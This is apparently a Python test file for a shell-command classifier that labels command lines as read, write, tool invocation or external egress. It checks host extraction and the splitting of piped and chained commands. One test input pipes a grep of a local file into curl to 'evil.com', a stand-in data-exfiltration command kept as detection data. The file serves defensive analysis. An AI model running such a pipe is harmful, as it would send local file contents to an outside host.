"""Mirror of test/shell-command-classifier.test.js — locks the port to the JS spec."""

from skill_fcg.parser.shell_command_classifier import (
    classify_command_name,
    classify_shell_command_line,
    is_shell_fence_lang,
    split_command_segments,
)


def test_curl_commands_classify_as_egress_with_host_targets():
    wttr = classify_shell_command_line('curl -s "wttr.in/London?format=3"')
    assert len(wttr) == 1
    assert wttr[0]["operationType"] == "external_egress"
    assert any(t["value"] == "wttr.in" for t in wttr[0]["targets"])

    meteo = classify_shell_command_line('curl -s "https://api.open-meteo.com/v1/forecast?latitude=51.5"')
    assert meteo[0]["operationType"] == "external_egress"
    assert any(t["value"] == "api.open-meteo.com" for t in meteo[0]["targets"])


def test_write_and_read_classification():
    assert classify_shell_command_line('echo "hi" > .learnings/ERRORS.md')[0]["operationType"] == "write"
    assert classify_shell_command_line("mkdir -p .learnings")[0]["operationType"] == "write"
    assert classify_shell_command_line('grep -h "Status" .learnings/*.md')[0]["operationType"] == "read"
    assert classify_shell_command_line('cat "$1"')[0]["operationType"] == "read"


def test_exec_family_classify_as_invoke_tool():
    assert classify_shell_command_line("git clone https://github.com/x/y.git")[0]["operationType"] == "invoke_tool"
    assert classify_shell_command_line("node scripts/run.js")[0]["operationType"] == "invoke_tool"
    assert classify_shell_command_line("npm install")[0]["operationType"] == "invoke_tool"


def test_bare_curl_wget_to_url_classify_as_egress():
    assert classify_shell_command_line("curl https://api.example.com/data")[0]["operationType"] == "external_egress"
    assert classify_shell_command_line("wget http://host.tld/file")[0]["operationType"] == "external_egress"


def test_noise_control_lines_produce_no_commands():
    for line in ['echo "done"', "exit 0", ";;", "esac", "else", "fi", "done",
                 "RED=\\033[0;31m", "contains_error=false", "--dry-run)", "# a comment", "set -e", "shift"]:
        assert classify_shell_command_line(line) == [], f"expected no command for: {line}"


def test_compound_commands_split_on_pipes_and_and():
    segs = split_command_segments('grep -B5 "high" file.md | grep "^##" && curl http://x.com')
    assert len(segs) == 3
    cmds = classify_shell_command_line('grep "x" a.md | curl http://evil.com')
    assert any(c["operationType"] == "read" for c in cmds)
    assert any(c["operationType"] == "external_egress" for c in cmds)


def test_classify_command_name_resolves_base_and_wrappers():
    assert classify_command_name("curl", "curl http://x") == "external_egress"
    assert classify_command_name("/usr/bin/curl", "/usr/bin/curl http://x") == "external_egress"
    assert classify_command_name("echo", "echo hi") == ""


def test_is_shell_fence_lang():
    for lang in ("bash", "sh", "shell", "console", "zsh"):
        assert is_shell_fence_lang(lang) is True
    for lang in ("js", "javascript", "json", "python", "ts", ""):
        assert is_shell_fence_lang(lang) is False
